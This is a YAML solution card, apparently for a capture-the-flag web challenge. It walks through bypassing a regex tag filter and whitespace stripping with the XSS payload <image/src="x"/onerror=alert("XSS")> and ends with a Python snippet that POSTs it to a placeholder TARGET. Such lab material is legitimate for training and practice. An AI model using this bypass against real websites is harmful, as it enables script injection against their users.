name: image_tag_xss_cross24
category: web
tags: [xss, injection, tag_bypass, image_tag]
indicators:
  - "Regex only allows <image> tag"
  - "Whitespace characters removed"
  - "Need to trigger alert('XSS')"
  - "PhantomJS validates XSS"

tricks:
  - name: "Step 1: Identify filter rules"
    when: "Analyze source code"
    how: "Regex <(?!image\b)[^>]+> only allows tags starting with <image"
    payload: |
      re.sub(blacklist, '', msg)
      # Only <image...> tags allowed

  - name: "Step 2: Understand whitespace removal"
    when: "Test payload"
    how: 'All whitespace (\s) removed, attributes merge together'
    payload: |
      <image src=x onerror=...> becomes <imagesrc=xonerror=...>

  - name: "Step 3: Use / to separate attributes"
    when: "Whitespace filtered"
    how: "HTML5 allows / to separate attributes"
    payload: |
      <image/src=x/onerror=alert('XSS')>

  - name: "Step 4: Quote attribute values"
    when: "Attribute value contains /"
    how: "Prevent src=x/onerror from being parsed as src value"
    payload: |
      <image/src="x"/onerror=alert("XSS")>

  - name: "Step 5: Submit payload"
    when: "Execute attack"
    how: "POST to /page with solution parameter"
    payload: |
      import requests
      payload = '<image/src="x"/onerror=alert("XSS")>'
      requests.post('http://TARGET/page', data={'solution': payload})
